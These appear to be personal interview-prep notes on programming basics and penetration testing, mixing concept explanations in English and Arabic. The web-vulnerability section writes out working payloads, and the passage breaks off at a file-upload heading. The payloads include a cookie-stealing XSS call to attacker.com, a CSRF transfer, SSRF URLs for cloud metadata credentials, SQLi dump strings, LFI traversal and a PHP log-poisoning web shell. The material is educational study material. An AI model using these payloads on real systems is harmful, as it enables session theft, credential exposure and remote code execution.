- https://developer.mozilla.org/en-US/docs/Web/Security
- https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy
- 
----
### 8- What is the difference between a class and an object in programming?
|Element|Class|Object|
|---|---|---|
|**Definition**|A blueprint or template used to create objects.|An actual instance created from a class.|
|**Description**|Abstract definition with attributes and methods.|Concrete implementation with real data.|
|**Data**|Doesn't hold specific data.|Holds specific data for that instance.|
|**Usage**|Used to define the structure and behavior.|Created from a class, used to perform actions.|
|**Memory**|Does not occupy memory until an object is created.|Occupies memory.|
|**Example**|`class Car:` with `color`, `speed`, etc.|`my_car = Car()` is an actual car object.|

![[Pasted image 20250530132743.png]]
  ![[What-is-class-768x659.png]]
**A:** A **class** is a blueprint or definition of a data structure and behavior (methods/attributes)[geeksforgeeks.org](https://www.geeksforgeeks.org/difference-between-class-and-object/#:~:text=Class%20Object%20Class%20is%20used,Objects%20are%20allocated%20memory). It describes what properties and methods its objects will have. An **object** is an instance of a class; it is an actual entity created in memory that follows the class’s blueprint. When you define a class, no memory is allocated. When you create an object, memory is allocated for its attributes[geeksforgeeks.org](https://www.geeksforgeeks.org/difference-between-class-and-object/#:~:text=Class%20Object%20Class%20is%20used,Objects%20are%20allocated%20memory). In other words, the class is the template, and the object is a concrete instantiation of that template.

---
### 9- What is inheritance in programming?

Inheritance is an OOP concept where a new class (child/subclass) is based on an existing class (parent/superclass)[en.wikipedia.org](https://en.wikipedia.org/wiki/Inheritance_\(object-oriented_programming\)#:~:text=In%20object,oriented%20languages%20like). The child class automatically acquires (inherits) the properties and methods of the parent class, allowing code reuse and extension.
![[Pasted image 20250530134017.png]]

----

### 10- What is chmod in Linux? and What does +x mean in Linux?

- `chmod` is a Linux command used to **change file or directory permissions**. It can add or remove read, write, and execute permissions for the user/owner, group, and others. The `+x` option specifically adds the execute permission. Thus, running `chmod +x filename` makes the file executable (as a program or script)[geeksforgeeks.org](https://www.geeksforgeeks.org/what-does-chmod-x-do-and-how-to-use-it/#:~:text=The%20chmod%20%2Bx%20command%20in,directly%20from%20the%20command%20line). For example, `chmod +x script.sh` allows that script to be run from the shell.

---
### 12- What are the re, BeautifulSoup, and requests libraries in Python?

- **`re`**: This is Python’s built-in regular expression library. It provides support for matching and working with regex patterns in text[docs.python.org](https://docs.python.org/3/library/re.html#:~:text=This%20module%20provides%20regular%20expression,to%20those%20found%20in%20Perl).
    
- **`BeautifulSoup`**: A third-party library for parsing HTML and XML documents. It lets you navigate and search the parse tree to extract data easily[crummy.com](https://www.crummy.com/software/BeautifulSoup/bs4/doc/#:~:text=Beautiful%20Soup%20is%20a%20Python,hours%20or%20days%20of%20work). It’s commonly used for web scraping.
    
- **`requests`**: A third-party HTTP library in Python (often called “HTTP for Humans”)[requests.readthedocs.io](https://requests.readthedocs.io/en/latest/#:~:text=Requests%20is%20an%20elegant%20and,Python%2C%20built%20for%20human%20beings). It simplifies sending HTTP requests and handling responses, compared to lower-level libraries.

_________________________
# Penetration Testing Interview Questions 

## Difference between vulnerability, threat , risk?

- A **Vulnerability** is a weakness in a system or application that can be exploited by an attacker[travasecurity.com](https://travasecurity.com/learn-with-trava/blog/the-difference-between-threat-vulnerability-and-risk-and-why-you-need-to-know/#:~:text=Vulnerability%20refers%20to%20a%20weakness,other%20words%2C%20threats%20exploit%20vulnerabilities).
    
- A **Threat** is any potential danger or attacker that can exploit a vulnerability to cause harm[travasecurity.com](https://travasecurity.com/learn-with-trava/blog/the-difference-between-threat-vulnerability-and-risk-and-why-you-need-to-know/#:~:text=If%20you%E2%80%99re%20trying%20to%20protect,destroy%2C%20or%20obtain%20an%20asset).
    
- **Risk** is the likelihood of a threat exploiting a vulnerability and the impact of that event. In practice, **Risk** = (Likelihood that the threat succeeds) × (Impact of the compromise)[travasecurity.com](https://travasecurity.com/learn-with-trava/blog/the-difference-between-threat-vulnerability-and-risk-and-why-you-need-to-know/#:~:text=In%20essence%2C%C2%A0risk%C2%A0refers%20to%20the%20potential,a%20vulnerability%20inside%20your%20system)[travasecurity.com](https://travasecurity.com/learn-with-trava/blog/the-difference-between-threat-vulnerability-and-risk-and-why-you-need-to-know/#:~:text=Notably%2C%20cyber%20risk%20is%20a,summed%20up%20with%20this%20formula). In simple terms, risk combines the possibility of exploitation (threat exploiting vulnerability) with the severity of the outcome.


---

## What is likelihood in risk?

Formula الي بحدد بيها الrisk
بيتحدد على الimpact

**A:** _Risk likelihood_ refers to the probability that a given threat will successfully exploit a vulnerability. It is often combined with impact to assess overall risk. For example, many models use a formula like `Risk = (Threat × Vulnerability) × Impact`[travasecurity.com](https://travasecurity.com/learn-with-trava/blog/the-difference-between-threat-vulnerability-and-risk-and-why-you-need-to-know/#:~:text=Notably%2C%20cyber%20risk%20is%20a,summed%20up%20with%20this%20formula) or `Risk = Likelihood × Impact`, where _Likelihood_ is essentially the risk likelihood (the probability of exploitation)[hbs.net](https://www.hbs.net/blog/risk-assessment-likelihood-impact#:~:text=3). In practice, you might rate likelihood as High/Medium/Low and multiply by an impact rating to quantify risk.

---
### Explain the CIA and DAD models.
 CIA =! DAD
 CIA (Confidentiality, Integrity, Availability): 

- **Confidentiality:** Ensuring that sensitive information is only accessible to authorized individuals and preventing unauthorized disclosure.
- **Integrity:** Maintaining the trustworthiness and completeness of data, ensuring it's not altered intentionally or unintentionally.
- **Availability:** Guaranteeing authorized users can access data and resources when needed. 

DAD (Disclosure, Alteration, Denial): 

- **Disclosure:** Unauthorized access to sensitive data, violating the confidentiality principle.
- **Alteration:** Unauthorized modification or destruction of data, compromising its integrity.
- **Denial:** Preventing authorized users from accessing data or systems, impacting availability. 

The DAD triad represents the different ways attackers can undermine the principles of a secure system, highlighting the potential threats that security professionals need to address.

Confidentiality = using encryption 
integrity = no manipulation or tampering 
Availability = load balancer

-----

**Least privilege** concept -> each user take the least privilege needed based on business needs

---

**Zero trust** -> no trust even to the admin
- Never trust any request by default—even from internal users. Every access request must be authenticated, authorized, and encrypted.

---
**Attack surface**-> each point an attacker can enter from.

- **Attack Surface:** The sum of all points (software, interfaces, services) where an attacker could try to enter or extract data. In other words, every exposed component (public endpoints, APIs, user interfaces, etc.) contributes to the attack surface[okta.com](https://www.okta.com/identity-101/what-is-an-attack-surface/#:~:text=An%20attack%20surface%20is%20the,by%20manipulating%20or%20downloading%20data). The smaller the attack surface, the fewer opportunities for attackers.
- Any entry points a threat actor could use to access your systems: 
  Open ports, exposed APIs, public web apps, third-party integrations.

----

## How can I minimize attack surface? 
### 1. **Implement Zero Trust Architecture**

Adopt a security model where no user or device is inherently trusted. Continuously verify identities and enforce strict access controls to ensure that only authorized entities can access resources.

### 2. **Enforce the Principle of Least Privilege**

Ensure that users and applications have only the minimum access necessary to perform their functions. This limits potential damage if credentials are compromised.

### 3. **Regularly Patch and Update Systems**

Keep all software, operating systems, and applications up to date with the latest security patches to address known vulnerabilities promptly. [Balbix+1Dell+1](https://www.balbix.com/insights/attack-vectors-and-breach-methods/?utm_source=chatgpt.com)

### 4. **Conduct Continuous Vulnerability Assessments**

Regularly scan your systems and networks to identify and remediate vulnerabilities before they can be exploited by attackers. [BlueVoyant](https://www.bluevoyant.com/knowledge-center/5-ways-to-reduce-your-attack-surface?utm_source=chatgpt.com)

### 5. **Segment Your Network**

Divide your network into isolated segments to prevent lateral movement by attackers. This containment strategy limits the spread of potential breaches. [Dell+2PurpleSec+2BlueVoyant+2](https://purplesec.us/learn/reduce-attack-surface/?utm_source=chatgpt.com)[BlueVoyant](https://www.bluevoyant.com/knowledge-center/5-ways-to-reduce-your-attack-surface?utm_source=chatgpt.com)

### 6. **Disable Unnecessary Services and Remove Unused Applications**

Reduce potential attack vectors by turning off services and removing applications that are not essential to your operations. [SentinelOne IT](https://www.sentinelone.com/cybersecurity-101/cybersecurity/attack-surface-reduction/?utm_source=chatgpt.com)

### 7. **Implement Strong Authentication Mechanisms**

Use multi-factor authentication (MFA) and robust password policies to enhance the security of user accounts. [Okta](https://www.okta.com/identity-101/what-is-an-attack-surface/?utm_source=chatgpt.com)

### 8. **Encrypt Sensitive Data**

Protect data at rest and in transit using strong encryption standards to prevent unauthorized access and data breaches. [PurpleSec](https://purplesec.us/learn/reduce-attack-surface/?utm_source=chatgpt.com)

### 9. **Educate and Train Employees**

Regularly conduct cybersecurity awareness training to help employees recognize and respond appropriately to phishing attempts and other social engineering attacks. [BlueVoyant+1CSO Online+1](https://www.bluevoyant.com/knowledge-center/5-ways-to-reduce-your-attack-surface?utm_source=chatgpt.com)

### 10. **Implement Attack Surface Reduction (ASR) Rules**

Utilize security tools that enforce ASR rules to block or restrict behaviors commonly used by malware, such as executing scripts or launching untrusted applications. [Reddit](https://www.reddit.com/r/crowdstrike/comments/1553lyf/guidance_for_enabling_attack_surface_reduction/?utm_source=chatgpt.com)

---

#### 🧭 Additional Best Practices

- **Conduct Regular Attack Surface Analyses:** Continuously monitor and assess your digital assets to identify new vulnerabilities and ensure that security measures are effective. [Wikipedia](https://en.wikipedia.org/wiki/Attack_surface?utm_source=chatgpt.com)
    
- **Secure Backup Systems:** Ensure that backup data is protected with the same rigor as primary data to prevent attackers from exploiting backup systems.
    
- **Limit Exposure of Internet-Facing Services:** Restrict access to services and applications that do not need to be publicly accessible to reduce potential entry points for attackers.

---
## 5 methodology for hacker? 

![[Pasted image 20250530153811.png]]
First planning
- Reconnaissance (Footprinting) or (Information Gathering)
- Scanning/Enumeration
- Gaining Access
- Privilege Escalation
- Maintaining Access (Persistence)
- Reporting

---

Q: What’s the difference between Black Box, Gray Box, and White Box penetration tests?

- **Black Box:** The tester has no prior knowledge of the target. Testing is done from an external attacker’s perspective, without any internal information[redscan.com](https://www.redscan.com/news/types-of-pen-testing-white-box-black-box-and-everything-in-between/#:~:text=test%20is%20determined%20by%20the,life%20attacker).
    
- **Gray Box:** The tester has limited information about the target (for example, some credentials or architecture info)[redscan.com](https://www.redscan.com/news/types-of-pen-testing-white-box-black-box-and-everything-in-between/#:~:text=test%20is%20determined%20by%20the,life%20attacker). It’s a hybrid approach.
    
- **White Box:** The tester has full knowledge of the internal workings (source code, architecture, credentials)[redscan.com](https://www.redscan.com/news/types-of-pen-testing-white-box-black-box-and-everything-in-between/#:~:text=test%20is%20determined%20by%20the,life%20attacker). This simulates an insider or a very thorough audit.


---
## Q: Explain and exploit XSS, CSRF, SSRF, SQLi (with types), LFI, IDOR.
How to exploit XSS —> client side

Exploiting vulnerabilities like XSS, CSRF, SSRF, SQLi, LFI, and IDOR requires a deep understanding of web application security. It's crucial to remember that attempting to exploit these vulnerabilities on systems you do not own or have explicit permission to test is illegal and unethical.
Here's an explanation and conceptual exploitation approach for each:

## 1. Cross-Site Scripting (XSS)

Explanation:

XSS is a type of security vulnerability typically found in web applications. It enables attackers to ==inject client-side scripts== (usually JavaScript) into web pages viewed by other users. When a victim's browser executes the malicious script, it can steal cookies, session tokens, or other sensitive information, or even redirect the user to malicious sites, deface the website, or perform actions on behalf of the user.

**Types of XSS:**

- **Reflected XSS:** The injected script is not permanently stored on the target server. It's reflected off the web server, for example, in an error message, search result, or any other response that includes data sent by the user as part of the request. The attacker must trick the victim into clicking a specially crafted link.

- **Stored XSS (Persistent XSS):** The injected script is permanently stored on the target server, for example, in a database, comment field, or forum post. When a user visits the affected page, the malicious script is retrieved from the server and executed by their browser. This is often considered more dangerous because it doesn't require the attacker to craft individual malicious links for each victim.

- **DOM-based XSS:** The vulnerability lies in the client-side code rather than the server-side code. The malicious payload is executed as a result of client-side script modifying the Document Object Model (DOM) environment in the victim's browser. The server never sees the malicious script.

**Conceptual Exploitation:**

- **Scenario:** A website has a search bar that doesn't properly sanitize user input.
- **Attack:**
    - **Reflected XSS:** An attacker crafts a URL like `http://example.com/search?query=<script>alert('XSSed!')</script>`. If a user clicks this link, the script will execute in their browser, displaying an alert box. A more sophisticated attack might steal their session cookie: `http://example.com/search?query=<script>document.location='http://attacker.com/stealcookie.php?cookie='+document.cookie</script>`.
    
    - **Stored XSS:** An attacker posts a comment on a blog: `<script>alert('You\'ve been XSSed by a comment!');</script>`. Every user who views this comment will have the script executed in their browser.
    
	- **DOM-based XSS:** A JavaScript function takes a URL parameter and directly writes it to the page without validation. `location.hash.slice(1)` is used to get the fragment identifier and then `document.write()` writes it directly into the HTML. An attacker could craft `http://example.com/page.html#<img src=x onerror=alert(1)>`.
```
## 🧩 المصطلحات: Source و Sink

- **Source (المصدر):** هو المكان الذي يمكن للمهاجم التحكم فيه لإدخال بيانات، مثل `location.hash` أو `location.search`.
    
- **Sink (المصب):** هو الوظيفة أو العنصر الذي يتم تمرير البيانات إليه ويمكن أن يؤدي إلى تنفيذ تعليمات جافاسكريبت، مثل `document.write()` أو `innerHTML`.
    

في هذا المثال:

- **Source:** `location.hash.slice(1)`
    
- **Sink:** `document.write()
```

---

## 2. Cross-Site Request Forgery (CSRF) / One-Click Attack / Session Riding

Explanation:

CSRF is an attack that tricks a victim into submitting a malicious request to a web application they are already authenticated to. Unlike XSS, which injects malicious code into a website, CSRF exploits the trust that a web application places in a user's browser. If a user is logged into a website (e.g., their bank), and an attacker crafts a malicious request (e.g., "transfer money") and embeds it in a link or image on another site, clicking that link or viewing that image can execute the request on the victim's behalf without their knowledge.

**Conceptual Exploitation:**

- **Scenario:** A bank website allows users to transfer funds via a GET request like `http://bank.com/transfer?account=attacker_account&amount=1000`.
- **Attack:**
    1. The attacker crafts a malicious web page (e.g., `malicious-site.com`) containing an image tag:
        
        HTML
        
        ```
        <img src="http://bank.com/transfer?account=attacker_account&amount=1000" style="display:none;" />
        ```
        
    2. The attacker sends a phishing email to the victim, luring them to visit `malicious-site.com`.
    3. If the victim is logged into their bank account when they visit `malicious-site.com`, their browser will automatically send the request to `bank.com` along with their session cookies.
    4. The bank server, seeing a valid authenticated request, processes the transfer without the victim's explicit consent.

### Mitigation
- CSRF tokens help prevent CSRF attacks because attackers cannot make requests to the backend without valid tokens. Each CSRF token should be secret, unpredictable, and unique to the user session.-
### Resource:
- [Cross Site Request Forgery (CSRF) | OWASP Foundation](https://owasp.org/www-community/attacks/csrf)

---

## 3. Server-Side Request Forgery (SSRF)

Explanation:

SSRF is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's1 choosing. This can be used to scan internal networks, access restricted services, or even trigger actions on other internal systems. Essentially, the vulnerable server acts as a proxy for the attacker's requests.

**Conceptual Exploitation:**

- **Scenario:** A web application fetches a user-provided URL to display an image or content. For example, a feature that allows users to embed images from external websites.
- **Vulnerable code (simplified):**
    
    PHP
    
    ```
    <?php
    $url = $_GET['url'];
    // Insecure: Directly fetching a user-provided URL
    echo file_get_contents($url);
    ?>
    ```
    
- **Attack:**
    - **Accessing internal services:** An attacker could try to access internal services not directly exposed to the internet. If there's an admin panel on `http://127.0.0.1/admin`, the attacker could craft: `http://example.com/image_fetcher.php?url=http://127.0.0.1/admin`.
    - **Port scanning internal network:** The attacker can try to make the server request different ports on internal IPs to identify open services: `http://example.com/image_fetcher.php?url=http://192.168.1.1:8080`.
    - **Accessing cloud metadata services:** In cloud environments, specific IPs like `http://169.254.169.254` (AWS metadata service) can provide sensitive information about the instance: `http://example.com/image_fetcher.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`.

---

## 4. SQL Injection (SQLi)

Explanation:

SQL Injection is a code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution (e.g., to2 dump database contents to the attacker). It exploits vulnerabilities in a web application's database interactions, typically when user input is concatenated directly into SQL queries without proper sanitization or parameterization.

**Types of SQLi:**

- **In-band SQLi (Error-based & Union-based):**
    - **Error-based SQLi:** The attacker relies on error messages displayed by the database server to gather information about the database structure.
    - **Union-based SQLi:** The attacker uses the `UNION` operator to combine the results of a malicious query with the results of the legitimate query, retrieving data from other tables.
- **Inferential SQLi (Blind SQLi):**
    - **Boolean-based Blind SQLi:** The attacker sends SQL queries to the database that ask a true/false question. The response from the web application (e.g., a change in page content or the presence/absence of an error) indicates whether the query was true or false, allowing the attacker to infer information character by character.
    - **Time-based Blind SQLi:** Similar to Boolean-based, but instead of relying on content changes, the attacker uses `SLEEP()` or `BENCHMARK()` functions (or equivalent database-specific functions) to make the database delay its response if a condition is true. The attacker measures the response time to infer information.
- **Out-of-band SQLi:** The attacker uses the database server's ability to make requests to external systems (e.g., DNS lookups, HTTP requests) to exfiltrate data or trigger actions. This is less common and depends on specific database features.

**Conceptual Exploitation:**

- **Scenario:** A login form uses a vulnerable SQL query like:
    
    SQL
    
    ```
    SELECT * FROM users WHERE username = '$username' AND password = '$password';
    ```
    
- **Attack (Example for Union-based SQLi):**
    1. **Vulnerable input field (username):** `admin' UNION SELECT 1,database(),3,4,5-- -`
    2. **Resulting query:**
        
        SQL
        
        ```
        SELECT * FROM users WHERE username = 'admin' UNION SELECT 1,database(),3,4,5-- -' AND password = '$password';
        ```
        
        The `-- -` comments out the rest of the original query, and `UNION SELECT` combines results. The attacker can then try to find the number of columns (by trial and error or error messages), and then replace `1,database(),3,4,5` with columns like `username, password, email` from other tables (e.g., `users` table).
    3. **To get table names:** `admin' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema=database()-- -`
    4. **To get column names:** `admin' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'-- -`
    5. **To dump data:** `admin' UNION SELECT 1,username,password,email,5 FROM users-- -`

---

## 5. Local File Inclusion (LFI)

Explanation:

LFI is a vulnerability that allows an attacker to include files on the server, often by exploiting flawed input validation when a web application constructs a file path. If the attacker can control parts of the file path, they can include arbitrary local files, potentially exposing sensitive information (e.g., configuration files, source code, password files) or even leading to remote code execution (RCE) if combined with other vulnerabilities (e.g., file upload, log poisoning).

**Conceptual Exploitation:**

- **Scenario:** A web application uses a URL parameter to load different pages: `http://example.com/index.php?page=about.php`.
- **Vulnerable code (simplified):**
    
    PHP
    
    ```
    <?php
    $page = $_GET['page'];
    include($page); // Insecure: Directly including user-provided input
    ?>
    ```
    
- **Attack:**
    - **Accessing sensitive files:**
        - `http://example.com/index.php?page=/etc/passwd` (Linux password file)
        - `http://example.com/index.php?page=../../../../etc/passwd` (using directory traversal to escape the current directory)
        - `http://example.com/index.php?page=C:\Windows\System32\drivers\etc\hosts` (Windows hosts file)
    - **Log poisoning for RCE:** If the web server logs user agent strings or other user-controlled input to a file (e.g., `/var/log/apache2/access.log`), an attacker can inject malicious PHP code into their user agent string. Then, by including the log file, the injected code will be executed:
        1. Set User-Agent header to `<?php system($_GET['cmd']); ?>`.
        2. Access `http://example.com/index.php?page=/var/log/apache2/access.log&cmd=ls%20-la`.

---

## 6. Insecure Direct Object Reference (IDOR)

Explanation:

IDOR is a type of access control vulnerability where an application uses user-supplied input to directly access an object (e.g., database record, file, or data) without proper authorization checks. This allows attackers to bypass authorization and access or modify resources that they are not supposed to.

**Conceptual Exploitation:**

- **Scenario 1: Direct access to resources via sequential IDs.**
    
    - A website displays user profiles using a URL like `http://example.com/profile?id=123`.
    - **Attack:** An attacker changes the `id` parameter to `124` or `125` to view other users' profiles without proper authorization. If the application only checks if _any_ user is logged in, but not if _the logged-in user_ is authorized to view _that specific ID_, an IDOR exists.
- **Scenario 2: Accessing documents or files via predictable names.**
    
    - A file download feature uses `http://example.com/download?file=invoice_john.pdf`.
    - **Attack:** The attacker tries `http://example.com/download?file=invoice_jane.pdf` or `http://example.com/download?file=admin_report.pdf` to access documents they shouldn't.
- **Scenario 3: Modifying data via predictable object IDs in API calls.**
    
    - An e-commerce application allows a user to update their order details via an API endpoint: `POST /api/orders/456/update_status`.
    - **Attack:** An attacker, logged in as a regular user, intercepts the request and changes `456` (their order ID) to `123` (another user's order ID) to try and modify someone else's order status.

---

**Important Note:** This information is for educational purposes only. Always obtain explicit permission before conducting any security testing on systems you do not own. Engaging in unauthorized access or testing is illegal and can lead to severe consequences. Ethical hacking and responsible disclosure are crucial in the cybersecurity field.
- **XSS (Cross-Site Scripting):** An attack that injects malicious JavaScript into a web page. Types: _Reflected XSS_ (input is immediately echoed in the response, usually via a malicious link)[owasp.org](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_\(XSS\)#:~:text=There%20are%20three%20forms%20of,Stored%20XSS%20is%20often), _Stored XSS_ (input is stored on the server and shown later to other users)[owasp.org](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_\(XSS\)#:~:text=,page%20applications%2C%20and%20APIs%20that), and _DOM XSS_ (client-side scripting issues). Exploits allow stealing cookies, hijacking sessions, defacing content, etc.
    
- **CSRF (Cross-Site Request Forgery):** Tricks an authenticated user’s browser into sending unwanted requests to a trusted site[cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#:~:text=A%20Cross,requests%20and%20forged%20authenticated%20requests). Since the browser automatically includes the user’s cookies, the forged request executes with that user’s privileges. For example, an attacker can send a hidden form that causes a state-changing action on the target site.
    
- **SSRF (Server-Side Request Forgery):** Occurs when an application fetches a remote resource based on user input without validation[owasp.org](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/#:~:text=SSRF%20flaws%20occur%20whenever%20a,ACL). The attacker can supply a URL (often internal) and the server will make that request. This can be used to access internal systems, metadata endpoints, or bypass firewalls by making the server act as a proxy.
    
- **SQL Injection (SQLi):** Inserting malicious SQL queries through input fields[owasp.org](https://owasp.org/www-community/attacks/SQL_Injection#:~:text=A%20SQL%20injection%20attack%20consists,execution%20of%20predefined%20SQL%20commands). Types: _In-band_ (e.g., Union-based or error-based SQLi, where data is retrieved via the same channel), _Inferential/Blind_ (boolean-based or time-based, where the response is not directly visible). Successful SQLi can read or modify database data, bypass authentication, or even execute commands.
    
- **LFI (Local File Inclusion):** The application includes a file from disk based on user input. If input isn’t sanitized, attackers can use directory traversal (e.g. `../../etc/passwd`) to view or execute local files[owasp.org](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion#:~:text=Local%20file%20inclusion%20,as%20JSP%2C%20ASP%20and%20others).
    
- **IDOR (Insecure Direct Object Reference):** An access control vulnerability where the app uses user-supplied IDs to access objects directly. By changing the ID in the URL or parameters, an attacker can access data of another user[portswigger.net](https://portswigger.net/web-security/access-control/idor#:~:text=Here%2C%20the%20customer%20number%20is,an%20example%20of%20an%20IDOR). For example, changing `user_id=100` to `user_id=101` might reveal someone else’s record if no checks are in place.



---
## What Is Authentication, Authorization, And Accounting (AAA)?

Authentication, Authorization, and Accounting (AAA) is a foundational security framework used to manage user access, enforce policies, and monitor activities within computer networks. This model ensures that only authenticated and authorized users can access specific resources, and their actions are tracked for auditing and compliance purposes.[GeeksforGeeks+3Informa TechTarget+3Fortinet+3](https://www.techtarget.com/searchsecurity/definition/authentication-authorization-and-accounting?utm_source=chatgpt.com)

### 🔐 1. Authentication “Who are you?”

**Authentication** is the process of verifying the identity of a user or device attempting to access a system. Common methods include:[Portnox](https://www.portnox.com/cybersecurity-101/aaa-security/?utm_source=chatgpt.com)

- **Passwords**: Traditional method requiring a secret word or phrase.
    
- **Biometric verification**: Using fingerprints, facial recognition, or retina scans.
    
- **Smart cards or tokens**: Physical devices that provide access credentials.
    
- **Digital certificates**: Electronic documents that prove ownership of a public key.
    

The goal is to ensure that the entity requesting access is genuinely who they claim to be.


### 🛂 2. Authorization “What can you access?”
**Authorization** determines the permissions and privileges granted to an authenticated user or device. It answers the question: "What is this user allowed to do?" For instance:[Portnox](https://www.portnox.com/cybersecurity-101/aaa-security/?utm_source=chatgpt.com)

- A user may be permitted to read files but not modify them.
    
- An administrator might have full access to all system settings.
    

Authorization ensures that users can only perform actions and access resources that they're permitted to, based on predefined policies.[Wikipedia+1Portnox+1](https://en.wikipedia.org/wiki/Computer_access_control?utm_source=chatgpt.com)


### 📊 3. Accounting

**Accounting** involves tracking and recording user activities within the system. This includes:

- **Session durations**: How long a user was active.
    
- **Resource usage**: Data consumed, services accessed, etc.
    
- **Activity logs**: Detailed records of actions taken by the user.[Wikipedia+3Wikipedia+3Portnox+3](https://en.wikipedia.org/wiki/Authentication?utm_source=chatgpt.com)


Accounting provides an audit trail, which is essential for:[Wikipedia+1StrongDM+1](https://en.wikipedia.org/wiki/Computer_access_control?utm_source=chatgpt.com)

- **Security auditing**: Identifying and investigating suspicious activities.
    
- **Compliance**: Meeting regulatory requirements.
    
- **Billing**: Charging users based on resource consumption.
    


### 🔄 How AAA Works Together

The AAA framework operates in a sequential manner:[GeeksforGeeks+5StrongDM+5Informa TechTarget+5](https://www.strongdm.com/blog/aaa-security?utm_source=chatgpt.com)

1. **Authentication**: Verify the user's identity.
    
2. **Authorization**: Determine what the authenticated user is allowed to do.
    
3. **Accounting**: Monitor and record the user's activities.[Auth0+13Informa TechTarget+13Wikipedia+13](https://www.techtarget.com/searchsecurity/definition/authentication-authorization-and-accounting?utm_source=chatgpt.com)[Portnox](https://www.portnox.com/cybersecurity-101/aaa-security/?utm_source=chatgpt.com)[Wikipedia+3Wikipedia+3Portnox+3](https://en.wikipedia.org/wiki/Computer_access_control?utm_source=chatgpt.com)
    

This sequence ensures a secure and accountable access control system.

### 🧰 Common AAA Protocols

Several protocols implement the AAA framework:

- **RADIUS (Remote Authentication Dial-In User Service)**: Widely used for network access, especially in wireless and VPN environments.
    
- **TACACS+ (Terminal Access Controller Access-Control System Plus)**: Provides more granular control, often used in enterprise environments.
    
- **Diameter**: An evolution of RADIUS, designed to address its limitations and support modern network requirements.[Wikipedia+7GeeksforGeeks+7Portnox+7](https://www.geeksforgeeks.org/computer-network-aaa-authentication-authorization-and-accounting/?utm_source=chatgpt.com)[Wikipedia+2Portnox+2Wikipedia+2](https://www.portnox.com/cybersecurity-101/aaa-security/?utm_source=chatgpt.com)


These protocols facilitate communication between network devices and AAA servers, ensuring consistent application of authentication, authorization, and accounting policies.[Securiti+1GeeksforGeeks+1](https://securiti.ai/glossary/aaa-server/?utm_source=chatgpt.com)


In summary, the AAA framework is crucial for maintaining secure and well-managed network environments. By verifying identities, controlling access, and monitoring activities, organizations can protect their resources and ensure compliance with security policies.




---
## What are CSP, Rate Limiting, Host Header Injection, and Clickjacking?

## Content Security Policy (CSP)

**What it is:** Content Security Policy (CSP) is an HTTP response header that website administrators use to control which resources (like scripts, stylesheets, images, fonts, etc.) a user agent (browser) is allowed to load for a given page. It acts as a whitelist, instructing the browser to restrict the origins and types of content that can be executed or rendered.

**How it works:** By defining a CSP, you can mitigate common web vulnerabilities, particularly Cross-Site Scripting (XSS) attacks. For example, a CSP can:

- **Prevent inline scripts:** Block scripts embedded directly in HTML.
    
- **Restrict script sources:** Only allow scripts from trusted domains.
    
- **Limit form submissions:** Control where HTML forms on your website can submit their data.
    
- **Prevent unsafe JavaScript functions:** Disable functions like `eval()` that can execute arbitrary strings as code.

**Purpose:** The primary goal of CSP is to prevent or minimize the risk of code injection attacks, such as XSS, by making it difficult for attackers to execute malicious scripts on your website.

## Rate Limiting

**What it is:** Rate limiting is a security measure that controls the amount of traffic a user or application can send to a server or service within a specific timeframe. It sets a cap on the number of requests allowed from a particular source (e.g., an IP address, user account, or API key) over a given period.

**How it works:** Rate limiting typically tracks the number of requests from a source and, if the limit is exceeded, it will temporarily block or throttle further requests from that source.

**Purpose:** Rate limiting is crucial for:

- **Preventing brute-force attacks:** By limiting login attempts, it makes it harder for attackers to guess passwords.
    
- **Mitigating Denial-of-Service (DoS) and Distributed Denial-of-Service (DDoS) attacks:** It helps prevent servers from being overwhelmed by a flood of requests.
    
- **Preventing web scraping and data exfiltration:** It limits how much data an attacker can extract from a website.
    
- **Ensuring fair use of services:** It prevents a single user or bot from monopolizing server resources.
    
- **Protecting APIs:** It safeguards APIs from abuse and overload.


## Host Header Injection

**What it is:** Host Header Injection is a web security vulnerability that occurs when a web application or server insecurely uses the HTTP `Host` header. The `Host` header specifies the domain name the client intends to access. When an application doesn't properly validate or sanitize this header, an attacker can manipulate its value to trick the server or application into performing unauthorized actions or generating incorrect responses.

**How it works:** Attackers can modify the `Host` header in their requests. If the application blindly trusts this manipulated value, it can lead to various attacks, including:

- **Password reset poisoning:** If password reset links are generated using the `Host` header, an attacker could manipulate it to direct the reset link to their own server.
    
- **Web cache poisoning:** An attacker can inject a malicious response into a web cache by manipulating the `Host` header, causing legitimate users to receive the poisoned content.
    
- **Website impersonation (phishing):** Attackers can trick users into visiting fake websites that look like the real ones by manipulating the `Host` header in redirected URLs.
    
- **Internal network exploitation:** Some applications might use the `Host` header for internal communication, potentially allowing an attacker to access internal services.


**Purpose:** This vulnerability arises from a lack of proper validation of user-supplied input, specifically the `Host` header, leading to the server or application misinterpreting requests or generating malicious URLs.

## Clickjacking

**What it is:** Clickjacking, also known as UI redress attack, is a malicious technique that tricks a user into clicking on a hidden or disguised webpage element that is actually part of another, often malicious, page. The user believes they are performing one action on a visible page, but their click is "hijacked" and routed to an invisible element on an overlaid page, leading to unintended consequences.

**How it works:** Attackers typically achieve this by:

- **Using iframes:** Embedding the target (legitimate) website within a transparent or opaque iframe on top of a malicious or deceptive website.
    
- **Layering elements:** Positioning the iframe's interactive elements (buttons, links) directly over visible, seemingly innocuous elements on the top-level page.

**Purpose:** The goal of clickjacking is to trick users into unknowingly:

- **Downloading malware.**
- **Providing credentials or sensitive information.**
- **Transferring money or making unauthorized purchases.**
- **Liking social media pages or performing other unwanted actions.**
- **Enabling camera/microphone access or revealing location data.**

**Defense mechanisms:** Common defenses against clickjacking include using HTTP headers like `X-Frame-Options` and the `frame-ancestors` directive within Content Security Policy (CSP) to control whether a page can be loaded in an iframe.


----
## What are best practices for preventing file upload vulnerabilities?
Good practices include:

